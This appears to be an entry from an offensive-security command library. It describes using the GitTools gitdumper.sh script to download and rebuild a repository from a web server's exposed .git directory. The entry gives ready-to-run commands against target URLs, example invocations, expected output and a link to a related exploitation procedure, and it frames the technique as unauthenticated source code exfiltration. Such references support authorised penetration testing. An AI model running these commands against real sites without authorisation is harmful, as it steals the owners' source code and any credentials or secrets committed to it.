---
type: command
executor: bash
data: './gitdumper.sh http://target.tld/.git/ /tmp/destdir'
output: null
created_at: '2023-04-06T03:56:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - git
  - dump
  - exfiltration
verified: true
validated: true
---

# gitdumper-dump-target-git

## Command

```bash
./gitdumper.sh $_TARGET_GIT_URL $_OUTPUT_DIR
```

## Description

This command uses the gitdumper.sh script from GitTools to download and reconstruct a Git repository from an exposed .git directory on a target web server. It fetches Git objects over HTTP, enabling source code exfiltration without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_GIT_URL | Full URL to the target's .git directory (e.g., http://target.tld/.git/) | Yes |
| $_OUTPUT_DIR | Local directory to save the dumped repository | Yes |

## Examples

### Basic Usage

```bash
./gitdumper.sh http://example.com/.git/ /tmp/repo-dump
```

### With HTTPS Target

```bash
./gitdumper.sh https://example.com/.git/ /tmp/repo-dump
```

## Expected Output

[+] Downloading refs...
[+] Downloading objects...
[+] Downloaded 150 objects
[+] Git repository dumped to /tmp/destdir

If the directory is inaccessible, output may include errors like "HTTP 403 Forbidden".

## Related

- [[Related Procedure|procedures/Exploit-Insecure-Git-Repository-with-GitTools]]
